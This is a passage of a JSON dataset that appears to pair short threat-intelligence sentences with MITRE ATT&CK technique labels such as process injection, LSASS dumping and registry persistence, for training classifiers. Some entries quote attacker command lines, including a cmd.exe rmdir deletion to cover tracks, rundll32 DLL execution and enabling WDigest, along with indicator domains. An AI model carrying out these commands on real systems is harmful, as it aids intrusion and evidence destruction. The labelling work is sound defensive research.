    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP in communications with C2.(Citation: Cybereason Valak May 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download files to the compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used LoadLibrary() GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Note: aswrundll.exe is very similar to Microsoft’s own rundll32.exe - it allows you to execute DLLs by calling their exported functions",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "contains watchdog functionality that periodically ensures HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load is set to point to its executable.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Leveraging a dual-use tool, PCHunter64, to acquire detailed process and system information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "or Windows Scripting",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used to proxy RDP connections and connect to another computer.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "looked for a specific process running on infected servers.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Note that IP addresses can be reallocated",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "runs WMI queries every second to get all process creation and termination events.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can self delete to cover its tracks.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "threat actor first ran some initial discovery on the host using built-in Windows utilities like ipconfig",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has called ZwWriteVirtualMemory ZwProtectVirtualMemory ZwQueueApcThread and NtResumeThread to inject itself into a remote process.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Another batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "backdoor that is capable of executing commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Curl is used to download the malicious DLL file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "enables the data transfer with URL syntax for protocols such as HTTP/HTTPS",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "used WMI with an explorer.exe token to execute on a remote share.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can discover specified filetypes and log files on a targeted system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "backdoors can list running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can run cmd.exe with parameters.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use the `ShowWindow` API to avoid detection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "collects file and directory metadata",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "is capable of listing files folders and drives on a victim.(Citation: Dell TG-3390)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated hosts looking for the system's machine name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can query the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI to see if the value `OracleOcilib` exists.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "wmic",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "collects the computer name OS versioning information and OS install date and sends the information to the C2.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "“cmd /c",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "write in the registry information",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The “upload” command downloads files from the CnC and saves them locally in “C:\\ProgramData“",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "dropped additional tools to victims during their operation including portqry.exe a renamed cmd.exe file winrar and .(Citation: Cybereason Soft Cell June 2019)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives drive type and free space.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI to gather system information and to spawn processes for code injection.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Following HTTPS activity,",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "gathers the hostname and OS version from the victims machine.(Citation: Talos Micropsia June 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "dropped and added officeupdate.exe to scheduled tasks.(Citation: Malwarebytes Higaisa 2020)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "USING \".BAT\" FILES",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The  group is known to utilize WMI for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors used domain credentials including domain admin for lateral movement and privilege escalation.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has achieved persistence via writing a PowerShell script to the autorun registry key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "malware has used HTTP for C2.(Citation: Unit 42 Magic Hound Feb 2017)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used various batch scripts to establish C2 and download additional files. 's backdoor malware has also been written to a batch file.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to create a remote shell and run given commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can use WMI for execution.(Citation: Cybereason Molerats Dec 2020)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "C:\\Windows\\System32\\cmd.exe /c rundll32.exe C:\\ProgramData\\x86.dll, StartA",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "API call attempts to processes:",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "is a batch script that creates a new user",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has deleted batch files after execution.  ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can delete files via `C:\\Windows\\system32\\cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 > Nul & rmdir /s /q`.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can download files to compromised systems after receiving a command with the string `downloaddd`.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can run `C:\\Windows\\system32\\cmd.exe /c cmd /c ipconfig /all 2>&1` to discover network settings.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has maintained persistence by placing itself inside the current user's startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "drop the defenses of the victim, inhibit monitoring, disable networking",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "used various types of scripting to perform operations including batch scripts.(Citation: US-CERT TA18-074A)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can monitor processes.(Citation: Symantec Trojan.Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can use a variety of API calls to execute shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The message sent to the C2 will be “file is deleted.” if successful or “file is not deleted.” if unsuccessful",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "uses  to clean up the environment and attempt to prevent detection.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "recursively deletes all files",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "checks for the systems Windows OS version and hostname.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list running processes through the use of `tasklist`.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks establish persistence for  and other malware.(Citation: CrowdStrike Grim Spider May 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "creates a backdoor through which remote attackers can inject files into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "extract data and files from endpoint devices.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can list all running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate files on a compromised host in order to encrypt files with specific extensions.(Citation: CISA AR21-126A FIVEHANDS May 2021)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "will delete itself if a certain server response is received.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "List of recently opened files and folders on the computer.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "creates a command-line shell using cmd.exe.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "loader can use API functions to load the  backdoor into the same Application Domain within which the legitimate AD FS managed code is executed.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used macros in Word documents that would download a second stage if executed.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "communicated via HTTP GET or HTTP POST requests to third party servers for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Powershell will be invoked and it fetch the Qakbot payload from Internet",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "designed to hamper Windows Defender",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "queries the Registry to determine the correct Startup path to use for persistence.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "can detect the victim's file or folder list.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "surveys a system upon check-in to discover information in the Windows Registry with the reg query command.(Citation: Kaspersky Turla)  has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "HTTP stream containing the content",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "the list of processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has collected Office PDF and HWP documents from its victims.(Citation: Securelist Kimsuky Sept 2013)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "malware can use process hollowing to inject one of its trojans into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors enabled Wdigest by changing the `HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest` registry value from 0 (disabled) to 1 (enabled).",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "the exfiltration of data on the system, such as OS, Processor (architecture),",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "a process injection in one of the svchost processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Remote scheduled tasks to launch their customized PowerShell backdoor",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.(Citation: Talos Cobalt Strike September 2020)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify hardware information the computer name and OS information on an infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "executes batch scripts on the victims machine and can launch a reverse shell for command execution.(Citation: FireEye FELIXROOT July 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used multiple command-line utilities to enumerate running processes.(Citation: Volexity SolarWinds)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors XServer tool communicated using HTTP and HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can launch a remote command line to execute commands on the victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can iterate through running processes every six seconds collecting a list of processes to capture from later.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used weaponized documents in e-mail to compromise targeted systems.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe May 2021)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has the ability delete files from a compromised host.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "reflective PE injection allows the malware to load and execute its code directly from memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows command line to create a Registry entry under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used e-mail attachments to lure victims into executing malicious code.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can modify the `HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\` registry key so it can bypass the VB object model (VBOM) on a compromised host.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can gather data on the user of a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "by capturing the CredEnumerateA API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has been observed injecting in to Explorer.exe and other processes. (Citation: Picus Emotet Dec 2018)(Citation: Trend Micro Banking Malware Jan 2019)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence in the Startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "With Rundll32,",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "is capable of loading executable code via process hollowing.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can communicate over HTTP for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "downloads another dropper from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses the win32api.GetDiskFreeSpaceEx() function to retrieve the disk size in bytes",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can download additional scripts from a web server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can transfer files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure targets into downloading an attached executable (ZIP RAR or CAB archives) or document (PDF or other MS Office format).",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "accesses the memory of its host LSASS process and stores stolen credentials in a Mimikatz log file",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "and IP address",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "collect usernames",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RAM size and usage",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has collected credit card data using native API functions.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "LSASS Dump",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has called various native OS APIs.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used procdump to dump the LSASS process memory.(Citation: Microsoft HAFNIUM March 2020)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Thread Execution Hijacking",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the user clicked on the ISO file, which created a new virtual hard drive disk",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "WMI persistence.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "also supports command-line arguments,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "actors spawned shells on remote systems on a victim network to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can download files and upgrade itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "techniques like process hollowing where the process is created in suspend mode and then replaced with malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors loaded DLLs via `rundll32` using the `svchost` process.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "malicious spearphishing attachments required a user to open the file after receiving.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "achieves persistence by using various Registry Run keys.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "obtains the victim’s username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "collects the current username and sends it to the C2 server.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can list directory entries. ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft Windows Defender AntiVirus Protection disabled",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used RDP to move laterally in victim environments.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP or HTTPS for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Disables the \"administrator in Admin Approval Mode\" user type (disables UAC prompts)",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "dir c:\\",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Parse browser application and browser version installed in the compromised host by querying \"SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet\" or \"SOFTWARE\\Clients\\StartMenuInternet\" registry",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "injects itself into various processes depending on whether it is low integrity or high integrity.(Citation: FinFisher Citation)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use a variety of API calls on a compromised host.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "s dropper can list all running processes.(Citation: Securelist Dtrack)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "One variant of  creates a new service using either a hard-coded or randomly generated name.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "deleted the specific history items related to threat actor activity",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": ", staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "injects its DLL component into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "sends an OS version identifier in its beacons.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can execute `getUsername` on compromised systems.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "authentication from a known attacker IP address into the Azure AD Connector cloud account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can gather extended system information such as information about the operating system disks and memory.(Citation: PWC KeyBoys Feb 2017)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Code responsible for downloading cron_script file",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used the `tasklist /s` command as well as `taskmanager` to obtain a list of running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute commands via `cmd.exe`.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can collect data on running and parent processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has searched for files on the system such as documents located in the desktop folder.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can set and delete Registry keys.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has registered itself as a scheduled task to run each time the current user logs in.(Citation: ESET Sednit Part 1)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has a plugin to perform RDP access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "has a command to obtain a directory listing.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "injecting itself into a running explorer.exe process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "An  loader Trojan uses a cmd.exe and batch script to run its payload.(Citation: Unit 42 Playbook Dec 2017) The group has also used macros to execute payloads.(Citation: Talos Seduploader Oct 2017)(Citation: Unit42 Cannon Nov 2018)(Citation: Accenture SNAKEMACKEREL Nov 2018)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can query the Registry for its configuration information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "uses the command shell to run appropriate commands",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can gather information on the mapped drives OS version computer name DEP policy memory size and system volume serial number.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has checked the system settings to see if Arabic is the configured language.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has intentionally deleted computer files to cover their tracks including with use of the program CCleaner.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has encrypted and stored its orchestrator code in the Registry as well as a PowerShell script into the WsqmCons Registry key.(Citation: ESET ComRAT May 2020) ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute shell commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses COM interfaces to schedule tasks",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS for command and control.(Citation: F-Secure The Dukes)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "makes their malware look like Flash Player Office or PDF documents in order to entice a user to click on it.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP for communication with the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute commands on the victims machine.(Citation: PaloAlto DNS Requests May 2016)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional modules and malware to victims machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "calls cmd.exe to run various DLL files via rundll32.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP and HTTPS in communication with C2 servers.(Citation: Trend Micro Qakbot May 2020)(Citation: Crowdstrike Qakbot October 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When the payload was executed, there were some telltale registry events observed",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "NetServerGetInfoto retrieve the current configuration for the local server",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "identifies files with certain extensions from USB devices then copies them to a predefined directory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a command to delete files from the victims machine.(Citation: Cybereason Oceanlotus May 2017)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "malware gathers system information via WMI including the system directory build number serial number version manufacturer model and total physical memory.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "attempts to download an encrypted binary from a specified domain.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the malware starts a function called bypassSMADAV",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "to download the malicious update.bat file from the C2 domain",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "modified legitimate Windows services to install malware backdoors.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)  created the StorSyncSvc service to provide persistence for Cobalt Strike.",
    "command": "",
    "labels": [
